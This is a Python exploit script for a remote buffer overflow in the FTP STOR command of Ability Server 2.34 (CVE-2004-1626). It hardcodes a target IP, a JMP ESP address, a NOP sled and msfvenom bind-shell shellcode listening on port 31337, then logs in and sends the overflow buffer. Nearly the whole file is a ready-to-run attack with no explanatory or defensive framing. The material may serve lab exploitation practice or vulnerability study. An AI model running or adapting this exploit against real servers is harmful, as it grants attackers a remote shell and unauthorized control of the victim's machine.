#!/usr/bin/python

###############################################################
#							      #
#   Ability Server 2.34 - FTP 'STOR' Remote Buffer Overflow   #
#       https://nvd.nist.gov/vuln/detail/CVE-2004-1626        #
#							      #
###############################################################

import socket

host = "10.0.20.45"
port = 21

# USER32.dll - JMP ESP: 759A4E2B
eip = '\x2B\x4E\x9A\x75'
eip_offset = 968
nopsled = 16
sc_bytes = 357

padding = 2000 - (eip_offset + 4 + nopsled + sc_bytes)

# msfvenom -b '\x00\xD9\x74\x24\xF4' -p windows/shell_bind_tcp LPORT=31337 -f c
# Payload size: 357 bytes
sc = (	"\xfc\xbb\xa7\x4a\x37\x99\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3" +
	"\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\x5b\xa2\xb5\x99\xa3" +
	"\x33\xda\x10\x46\x02\xda\x47\x03\x35\xea\x0c\x41\xba\x81\x41" +
	"\x71\x49\xe7\x4d\x76\xfa\x42\xa8\xb9\xfb\xff\x88\xd8\x7f\x02" +
	"\xdd\x3a\x41\xcd\x10\x3b\x86\x30\xd8\x69\x5f\x3e\x4f\x9d\xd4" +
	"\x0a\x4c\x16\xa6\x9b\xd4\xcb\x7f\x9d\xf5\x5a\x0b\xc4\xd5\x5d" +
	"\xd8\x7c\x5c\x45\x3d\xb8\x16\xfe\xf5\x36\xa9\xd6\xc7\xb7\x06" +
	"\x17\xe8\x45\x56\x50\xcf\xb5\x2d\xa8\x33\x4b\x36\x6f\x49\x97" +
	"\xb3\x6b\xe9\x5c\x63\x57\x0b\xb0\xf2\x1c\x07\x7d\x70\x7a\x04" +
	"\x80\x55\xf1\x30\x09\x58\xd5\xb0\x49\x7f\xf1\x99\x0a\x1e\xa0" +
	"\x47\xfc\x1f\xb2\x27\xa1\x85\xb9\xca\xb6\xb7\xe0\x82\x7b\xfa" +
	"\x1a\x53\x14\x8d\x69\x61\xbb\x25\xe5\xc9\x34\xe0\xf2\x2e\x6f" +
	"\x54\x6c\xd1\x90\xa5\xa5\x16\xc4\xf5\xdd\xbf\x65\x9e\x1d\x3f" +
	"\xb0\x0b\x15\xe6\x6b\x2e\xd8\x58\xdc\xee\x72\x31\x36\xe1\xad" +
	"\x21\x39\x2b\xc6\xca\xc4\xd4\x92\x63\x40\x32\x08\x64\x04\xec" +
	"\xa4\x46\x73\x25\x53\xb8\x51\x1d\xf3\xf1\xb3\x9a\xfc\x01\x96" +
	"\x8c\x6a\x8a\xf5\x08\x8b\x8d\xd3\x38\xdc\x1a\xa9\xa8\xaf\xbb" +
	"\xae\xe0\x47\x5f\x3c\x6f\x97\x16\x5d\x38\xc0\x7f\x93\x31\x84" +
	"\x6d\x8a\xeb\xba\x6f\x4a\xd3\x7e\xb4\xaf\xda\x7f\x39\x8b\xf8" +
	"\x6f\x87\x14\x45\xdb\x57\x43\x13\xb5\x11\x3d\xd5\x6f\xc8\x92" +
	"\xbf\xe7\x8d\xd8\x7f\x71\x92\x34\xf6\x9d\x23\xe1\x4f\xa2\x8c" +
	"\x65\x58\xdb\xf0\x15\xa7\x36\xb1\x26\xe2\x1a\x90\xae\xab\xcf" +
	"\xa0\xb2\x4b\x3a\xe6\xca\xcf\xce\x97\x28\xcf\xbb\x92\x75\x57" +
	"\x50\xef\xe6\x32\x56\x5c\x06\x17\x56\x62\xf8\x98" )

buffer = 'A'*eip_offset
buffer += eip
buffer += '\x90'*nopsled
buffer += sc
buffer += '\x90'*padding

print '[+] Buffer size is: ' + str(len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send('USER ftp\r\nPASS ftp\r\n')
print s.recv(1024)
s.send('STOR '+buffer+'\r\n')
print s.recv(1024)
s.close
